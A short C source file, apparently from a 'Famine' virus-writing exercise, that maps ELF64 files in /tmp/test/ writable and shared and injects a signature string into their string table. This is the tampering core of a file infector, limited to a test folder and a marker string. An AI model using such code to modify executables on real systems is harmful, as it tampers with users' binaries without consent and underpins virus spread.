#include "../inc/famine.h"

/**
 * @brief injects a string in the strtab on an ELF64 file
 * 
 * @param fd previously opened file descriptor
 * @return int 0 if success, a negative value if error
 */
int famine(int fd)
{
    struct stat s;
    void *mem = NULL;

    if (fstat(fd, &s) < 0 || (size_t)s.st_size <= sizeof(Elf64_Ehdr))
        return (-1);
    mem = mmap(mem, s.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
    if (mem == MAP_FAILED)
    {
        debug("fd %i: %s", fd, "map failed");
        return (-1);
    }
    if (is_elf_64(mem, s.st_size))
        add_str_to_strtab(FAMINE, fd, mem, s.st_size);
    munmap(mem, s.st_size);
    return 0;
}

int main(void)
{
    handle_folder("/tmp/test/", famine, 0644);
    // handle_folder("/tmp/test2", &ft_puts);
}